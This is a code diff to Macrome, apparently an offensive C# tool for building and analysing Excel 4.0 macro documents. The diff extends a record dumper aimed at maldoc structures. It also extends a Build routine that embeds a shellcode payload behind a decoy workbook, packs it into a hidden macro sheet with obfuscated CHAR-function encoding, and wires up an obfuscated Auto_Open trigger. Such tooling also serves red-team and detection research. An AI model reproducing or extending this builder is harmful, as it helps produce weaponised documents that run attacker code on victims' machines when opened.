@@ -13,6 +13,7 @@ using b2xtranslator.Spreadsheet.XlsFileFormat;
 using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
 using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
 using b2xtranslator.StructuredStorage.Reader;
+using b2xtranslator.xls.XlsFileFormat;
 
 namespace Macrome
 {
@@ -34,11 +35,14 @@ namespace Macrome
         /// Iterate through every BIFF Record and Dump it
         /// </summary>
         /// <param name="path">Path to the XLS file to dump</param>
-        public static void Dump(FileInfo path)
+        /// <param name="dumpAll">Dump all BIFF records, not the most commonly used by maldocs</param>
+        /// <param name="showAttrInfo">Explicitly display PtgAttr information in Formula strings. Defaults to False.</param>
+        /// <param name="dumpHexBytes">Dump the byte content of each BIFF record in addition to its content summary. Defaults to False.</param>
+        public static void Dump(FileInfo path, bool dumpAll = false, bool showAttrInfo = false, bool dumpHexBytes = false)
         {
             if (path == null)
             {
-                Console.WriteLine("path argument must be specified in Deobfuscate mode. Run deobfuscate -h for usage instructions.");
+                Console.WriteLine("path argument must be specified in Dump mode. Run dump -h for usage instructions.");
                 return;
             }
 
@@ -49,7 +53,38 @@ namespace Macrome
             }
 
             WorkbookStream wbs = new WorkbookStream(path.FullName);
-            Console.WriteLine(wbs.ToString());
+
+            List<RecordType> relevantTypes = new List<RecordType>()
+                {
+                    RecordType.BoundSheet8, //Sheet definitions (Defines macro sheets + hides them)
+                    RecordType.Lbl,         //Named Cells (Contains Auto_Start) 
+                    RecordType.Formula      //The meat of most cell content
+                };
+
+            int numBytesToDump = 0;
+            if (dumpHexBytes) numBytesToDump = 0x1000;
+
+            if (dumpAll)
+            {
+                WorkbookStream fullStream = new WorkbookStream(PtgHelper.UpdatePtgNameRecords(wbs.Records));
+                foreach (var record in fullStream.Records)
+                {
+                    Console.WriteLine(record.ToHexDumpString(numBytesToDump, showAttrInfo));
+                }
+
+            }
+            else
+            {
+                List<BiffRecord> relevantRecords = wbs.Records.Where(rec => relevantTypes.Contains(rec.Id)).ToList();
+                relevantRecords = RecordHelper.ConvertToSpecificRecords(relevantRecords);
+
+                relevantRecords = PtgHelper.UpdatePtgNameRecords(relevantRecords);
+                foreach (var record in relevantRecords)
+                {
+                    Console.WriteLine(record.ToHexDumpString(numBytesToDump, showAttrInfo));
+                }
+            }
+
         }
 
         /// <summary>
@@ -99,9 +134,11 @@ namespace Macrome
         /// <param name="macroSheetName">The name that should be used for the macro sheet. Defaults to Sheet2</param>
         /// <param name="outputFileName">The output filename used for the generated document. Defaults to output.xls</param>
         /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
+        /// <param name="method">Which method to use for obfuscating macros. Defaults to ObfuscatedCharFunc. </param>
         public static void Build(FileInfo decoyDocument, FileInfo payload, FileInfo payload64Bit, string preamble,
             PayloadType payloadType = PayloadType.Shellcode, 
-            string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false)
+            string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false,
+            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc)
         {
             if (decoyDocument == null || payload == null)
             {
@@ -177,7 +214,8 @@ namespace Macrome
 
             if (binaryPayload != null && binaryPayload.Length > 0)
             {
-                wbe.SetMacroBinaryContent(binaryPayload, curRw, curCol, dstRwStart, dstColStart + 1);
+
+                wbe.SetMacroBinaryContent(binaryPayload, curRw, curCol, dstRwStart, dstColStart + 1, method);
                 curRw = wbe.WbStream.GetFirstEmptyRowInColumn(colStart) + 1;
 
                 if (rwStart > 0xE000)
@@ -188,7 +226,7 @@ namespace Macrome
 
                 if (binary64Payload != null && binary64Payload.Length > 0)
                 {
-                    wbe.SetMacroBinaryContent(binaryPayload, curRw, curCol, dstRwStart, dstColStart + 2);
+                    wbe.SetMacroBinaryContent(binaryPayload, curRw, curCol, dstRwStart, dstColStart + 2, method);
                     curRw = wbe.WbStream.GetFirstEmptyRowInColumn(colStart) + 1;
 
                     if (rwStart > 0xE000)
@@ -200,9 +238,19 @@ namespace Macrome
                     macros = MacroPatterns.GetMultiPlatformBinaryPattern(preambleCode, macroSheetName);
                 }
             }
-            wbe.SetMacroSheetContent(macros, curRw,curCol, dstRwStart, dstColStart);
+            wbe.SetMacroSheetContent(macros, curRw,curCol, dstRwStart, dstColStart, method);
 
+            ushort charInvocationRw = 0xefff;
+            ushort charInvocationCol = 0x9f;
+            wbe.AddLabel("InvokeChar", charInvocationRw, charInvocationCol, true);
+            wbe.AddLabel("var", null, true);
             wbe.AddLabel("Auto_Open", rwStart, colStart);
+
+            //Using lblIndex 2, since that what var has set for us
+            wbe.AddFormula(
+                FormulaHelper.CreateCharInvocationFormulaForLblIndex(charInvocationRw, charInvocationCol, 2));
+
+
             wbe.ObfuscateAutoOpen();
 
             ExcelDocWriter writer = new ExcelDocWriter();
